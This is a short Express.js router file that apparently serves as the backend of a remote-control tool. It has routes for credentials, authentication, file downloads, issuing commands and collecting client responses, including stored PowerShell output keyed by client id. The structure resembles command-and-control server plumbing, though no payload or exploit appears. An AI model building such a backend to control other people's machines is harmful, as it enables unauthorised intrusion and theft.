const router = require('express').Router();
const express = require("express");
const FirstAuthentication = require('./Authentication/firstAuthenticationTool');
const CommandRouter = require('./Commands/routes/toolCommandsRouter');
const ToolResponsesRouter = require('./Responses/routes/toolResponsesRouter');
const StaticToolRoutes = require('../FilesRouters/routes/toolStaticRoutes');
const ToolPublicRoutes = require('../FilesRouters/routes/toolPublicRoutes');
const base64Decode = require('../Utils/MiddleWears/base64')
const toolCookieValidator = require('../Utils/MiddleWears/toolCookieValidator');
const {GenerateRandomId} = require("../Utils/UtilFunctions/utilFunctions");
const psResponse = require('../ToolRoutes/Responses/psResponse.model')

router.use(express.json())
router.use('/creds', ToolPublicRoutes);

router.use(base64Decode);

router.route('/ps/response').post((req, res) => {
    const response_id = GenerateRandomId(6);
    const clientId = req.headers['clientid'];
    let response = req.body.response;
    response = response.replace(/^(?=\n)$|^\s*|\s*$|\n\n+/gm,'')
    const newPsResponse = new psResponse({response_id: response_id, client_id: clientId, response: response});
    newPsResponse.save()
        .then(() => res.send())
        .catch(err => console.log(err.message));
});
router.use('/auth',FirstAuthentication)
router.use('/download', StaticToolRoutes);

router.use(toolCookieValidator);
router.use('/commands',CommandRouter)
router.use('/response', ToolResponsesRouter);
module.exports = router;